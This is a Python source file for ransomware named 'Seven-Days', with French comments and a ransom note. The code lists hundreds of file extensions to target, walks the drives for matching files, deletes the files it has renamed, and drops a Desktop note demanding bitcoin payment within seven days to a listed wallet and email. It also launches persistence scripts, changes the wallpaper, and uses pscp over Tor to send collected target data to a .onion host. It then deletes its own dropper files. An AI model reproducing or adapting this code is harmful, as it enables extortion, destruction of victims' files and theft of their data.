#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, json, string, sys
import datetime, random, time
from ctypes import *
from collections import defaultdict
import subprocess

__home__ = os.path.expanduser("~")
__root__ = os.path.abspath(os.path.dirname(sys.argv[0]))
install_path = __home__+'\\User_Data'
target_data = install_path + '\\target_data.json'
json_content = {}

class Target:
    def __init__(self):
        # Liste des extensions ciblés par le cryptolocker
        self.targeted_ext = [".jpg",".ogg", ".ogv", ".mkv", ".jpeg", ".flac", ".raw",
          ".tif", ".gif", ".png", ".bmp" , ".3dm", ".max", ".accdb", ".db", ".dbf", ".mdb",
          ".pdb", ".sql", ".dwg", ".dxf", ".c", ".cpp", ".cs", ".h", ".php", ".asp",
          ".rb", ".java", ".jar", ".class", ".py", ".js", ".aaf", ".aep", ".aepx", ".plb",
          ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd", ".indl", ".indt", ".indb",
          ".inx", ".idml", ".pmd," ".xqx", ".xqx", ".ai", ".eps", ".ps", ".svg", ".swf",
          ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx", ".docm", ".dotx", ".dotm",
          ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls", ".xlt", ".xlm", ".xlsx",
          ".xlsm", ".xltx", ".xltm", ".xlsb", ".xla", ".xlam", ".xll", ".xlw", ".ppt",
          ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm",
          ".sldx", ".sldm", ".wav", ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid", ".mpa",
          ".wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf", ".asx",
          ".flv", ".mpg", ".wmv", ".vob", ".m3u8", ".dat", ".csv", ".efx", ".sdf",
          ".vcf", ".xml", ".ses", ".qbw", ".qbb", ".qbm", ".qbi", ".qbr" , ".Cnt",
          ".des", ".v30", ".qbo", ".lgb", ".qwc", ".qbp", ".aif", ".qba",
          ".Tlg", ".Qbx", ".Qby" , ".1pa", ".Qpd", ".Txt", ".Set", ".Iif" , ".Nd",
          ".Rtp", ".Tlg", ".Wav", ".Qsm", ".Qss", ".Qst", ".Fx0", ".Fx1", ".Mx0",
          ".fpx", ".fxr", ".fim", ".ptb", ".Ai", ".pfb", ".cgn", ".vsd", ".cdr",
          ".Cmx", ".Cpt"," .Csl"," .Cur", ".Des", ".Dsf", ".Ds4", ".Drw", ".Dwg",".Eps",
          ".Ps", ".prn", ".gif", ".pcd", ".pct", ".pcx," ".Plt", ".Rif", ".Svg," ".Swf",
          ".tga", ".tiff", ".psp", ".ttf", ".Wpd", ".Wpg", ".Wi", ".Raw", ".Wmf", ".Txt",
          ".cal", ".cpx", ".Shw", ".Clk", ".Cdx", ".Cdt", ".Fpx", ".Fmv", ".Img", ".Gem",
          ".xcf", ".pic", ".mac", ".Met", ".PP4", ".Pp5", ".Ppf", ".Xls", ".Xlsx",
          ".xlsm", ".ppt", ".nap", ".pat", ".ps", ".prn", ".sct", ".vsd," ".wk3", ".wk4",
          ".xpm", ".zip", ".rar"]
    def create_initial_time(self):
        self.timestamp = time.time()
        self.beginning_file = install_path+'\\remove_it_will_break_system.txt'
        if(os.path.isfile(self.beginning_file)):
            pass
        else:
            with open(self.beginning_file, 'w') as time_file:
                # time_file.write(self.timestamp)
                print(self.timestamp, file = time_file)
            time_file.closed
    def watch_time(self):
        self.beginning_file = install_path+'\\remove_it_will_break_system.txt'
        with open(self.beginning_file, 'r') as time_file:
            self.current_time = time_file.readline()
        time_file.closed
        return self.current_time

    def delete_all_files(self):
        self.drives = self.target.get_drives()
        self.main_drives = ["".join("c:\\") if "c" in self.drives else self.drives[0]]
        self.main_drive = "".join(self.main_drives)
        # self.main_drive = __home__+r"\testing_sevendays"
        self.infected_files = self.renamed_files(self.main_drive)
        try:
            for ifile in self.infected_files:
                if("$Recycle.Bin" in ifile):
                    pass
                else:
                    os.remove(ifile)
        except:
            pass
    def prepare_folder(self):
        if not os.path.exists(install_path):
            os.makedirs(install_path)

    def create_help(self, target_token):
        now = datetime.datetime.now()
        help_content = """
                          .                                                      .
                        .n                   .                 .                  n.
                  .   .dP                  dP                   9b                 9b.    .
                 4    qXb         .       dX                     Xb       .        dXp     t
                dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
                9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
                 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
                  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
                    `9XXXXXXXXXXXP' `9XX'  SEVEN   `98v8P'  DAYS   `XXP' `9XXXXXXXXXXXP'
                        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                                     `'      9XXXXXX(   )XXXXXXP      `'
                                              XXXX X.`v'.X XXXX
                                              XP^X'`b   d'`X^XX
                                              X. 9  `   '  P )X
                                              `b  `       '  d'
                                               `             '

        Votre ordinateur est infecté par le ransomware Seven-Days.
        Tous vos fichiers personnels ont été chiffrés avec l'algorithme de chiffrement AES 256.
        Ne déplacez pas vos fichiers.
        Ne les renommez pas.
        Toute modification du système pourra entrainer l'impossibilité de déchiffrer les données.
        Vous avez 7 jours pour payer.
        Au delà de ce délais, tous les fichiers chiffrés seront supprimés.
        Le payement se fera avec des bitcoins.
        Le bitcoin est une monnaie informatique sûre.
        Voici les étapes:
        1) Veuillez creer un porte-feuille bitcoin à cette URL: https://www.kraken.com/
        2) Faites un versements sur cette adresse:
            1P16ob4krAvctVm69MkmUwkwzogVfoHrH2
        3) Envoyez un mail à l'adresse: sidonai@protonmail.com avec :
            - le justificatif de payement.
            - l'identifiant suivant: {}
        4) Vous receverez une clé par mail.
        5) Lancez le logiciel seven-days.exe sur votre bureau.
        6) Rentrez votre clé.
        7) Appuyez sur le bouton "Déchiffrement".

        Très cordialement,

        Team ooooh-click-27
        {}
        """.format(target_token, now.strftime("%Y-%m-%d %H:%M"))
        help_path = __home__+r'\Desktop\Chiffrement_Lisez_moi.txt'
        with open(help_path, 'w') as help_desktop:
            help_desktop.write(help_content)
        help_desktop.closed

    def token_gen(self, size=24, chars=string.ascii_uppercase + string.digits):
        self.key = ''.join(random.choice(chars) for _ in range(size))
        # self.target.save_key(self.key)
        return self.key

    def create_persistence(self):
        try:
            subprocess.Popen(__root__+r'\persistence.bat', shell=True, stdout = subprocess.PIPE)
        except:
            pass
    def create_shortcut(self):
        # import winshell
        # from win32com.client import Dispatch
        #
        # desktop = winshell.desktop()
        # path = os.path.join(desktop, "seven-days.lnk")
        # target = __root__+r"\seven-days.exe"
        # print(target)
        # wDir =  __home__+r"\Desktop"
        # print(wDir)
        # icon = __root__+r"\seven-days.exe"
        # print(icon)
        #
        # shell = Dispatch('WScript.Shell')
        # shortcut = shell.CreateShortCut(path)
        # shortcut.Targetpath = target
        # shortcut.WorkingDirectory = wDir
        # shortcut.IconLocation = icon
        # shortcut.save()
        try:
            subprocess.Popen(__root__+r'\create_shortcut.bat', shell=True, stdout = subprocess.PIPE)
        except:
            pass

    def create_persistence2(self):
        # import winshell
        # from win32com.client import Dispatch
        #
        # desktop = winshell.desktop()
        # path = os.path.join(desktop, "seven-days.lnk")
        # target = __root__+r"\seven-days.exe"
        # print(target)
        # wDir =  __home__+r"\Desktop"
        # print(wDir)
        # icon = __root__+r"\seven-days.exe"
        # print(icon)
        #
        # shell = Dispatch('WScript.Shell')
        # shortcut = shell.CreateShortCut(path)
        # shortcut.Targetpath = target
        # shortcut.WorkingDirectory = wDir
        # shortcut.IconLocation = icon
        # shortcut.save()
        try:
            subprocess.Popen(__root__+r'\persistence2.bat', shell=True, stdout = subprocess.PIPE)
        except:
            pass
    def save_key(self, key):
        global json_content
        self.key = key
        json_content['key'] = self.key
        with open(target_data, 'w', encoding='utf-8') as outfile:
            outfile.write(json.dumps(json_content, ensure_ascii=False))
        outfile.closed

    def save_token(self, target_token):
        global json_content
        self.token = target_token
        json_content['token'] = self.token
        with open(target_data, 'w', encoding='utf-8') as outfile:
            outfile.write(json.dumps(json_content, ensure_ascii=False))
        outfile.closed

    def get_key(self, target_data_json):
        self.key = 0
        with open(target_data_json) as data_file:
            data = json.load(data_file)
            for k, v in data.items():
                if(k == 'key'):
                    self.key = data[k]
        data_file.closed
        return self.key

    def get_drives(self):
        self.drives = []
        self.bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_lowercase:
            if self.bitmask & 1:
                self.drives.append(letter)
            self.bitmask >>= 1
        return self.drives

    def renamed_files(self, main_drive=None, encryption=False, target_data_json=None):
        if(target_data_json):
            self.infected_files = []
            with open(target_data_json) as data_file:
                data = json.load(data_file)
                for k, v in data.items():
                    if(k == 'infected_files'):
                        self.infected_files = data[k]
        elif(encryption is True):
            self.infected_files = []
            with open(target_data) as data_file:
                data = json.load(data_file)
                for k, v in data.items():
                    if(k == 'infected_files'):
                        self.infected_files = data[k]
        else:
            self.infected_files = []
            for root, dirs, files  in os.walk(main_drive):
                for filename in files:
                    if filename.endswith('.7days'):
                        self.current_file = root+os.sep+filename
                        self.infected_files.append(root + os.sep + filename)

        return self.infected_files

    def renaming_files(self, main_drive):
        global json_content
        self.targeted_files = []
        for root, dirs, files  in os.walk(main_drive):
            for filename in files:
                for ext in self.targeted_ext:
                    if filename.endswith(ext):
                        self.targeted_files.append(root + os.sep + filename)
        json_content['infected_files'] = self.targeted_files
        with open(target_data, 'w', encoding='utf-8') as outfile:
            outfile.write(json.dumps(json_content, ensure_ascii=False))

    def change_wallpaper(self):
        drive = "C:\\"
        folder = "Users\\sevendays\\Documents\\Share\\encrypter"
        image = "ring.jpg"
        image_path = os.path.join(drive, folder, image)
        SPI_SETDESKWALLPAPER = 20
        windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, image_path, 3)

    def send_data(self):
        try:
            self.send_data_process = subprocess.Popen(install_path+r"\pscp.exe -load tor10 -pw projetannueltorpass {} willow@awz7ilkejqr5nqj3.onion:push/".format(target_data), shell=True, stdout = subprocess.PIPE)
            self.send_data_process.wait()
            os.remove(target_data)
        except Exception as error:
            pass
        return

    def torkill(self):
        try:
            subprocess.Popen("taskkill /F /IM tor.exe", shell=True, stdout = subprocess.PIPE)
        except Exception as err2:
            print(err2)
            pass

    def clean_up(self):
        self.files_to_delete = ["\\pscp.exe", "\\invis.vbs", "\\seven-days.zip", "\\win_tor.zip", "\\unzip.vbs", "\\oncall.bat", "\\start.bat", "\\tor10.reg", "\\bam.bat", "\\wget1.vbs", "\\wget.exe"]
        try:
            for dfile in self.files_to_delete:
                self.file_to_delete = install_path+dfile
                os.remove(self.file_to_delete)
        except Exception as error:
            print(error)
            pass

        try:
            subprocess.Popen("rmdir /S /Q {}".format(install_path+"\\tor_unzip"), shell=True, stdout = subprocess.PIPE)
        except Exception as error:
            print(error)
            pass
